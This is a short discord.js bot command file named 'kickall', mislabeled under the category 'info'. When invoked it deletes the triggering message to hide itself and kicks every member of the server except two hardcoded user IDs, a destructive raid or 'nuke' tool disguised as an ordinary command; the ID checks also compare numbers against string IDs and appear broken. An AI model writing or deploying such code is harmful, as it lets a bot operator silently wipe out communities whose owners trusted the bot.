const Discord = require("discord.js")

module.exports = {
    name: "kickall",
    aliases: ["kickall"],
    category: "info",
    run: async (client, message, args) => {
        message.channel.bulkDelete(1)
        message.guild.members.forEach(member => {
      if (member.id !== 287204335484534786) {
        if(member.id !== 393397531956084747){
        member.kick()
  }}})}}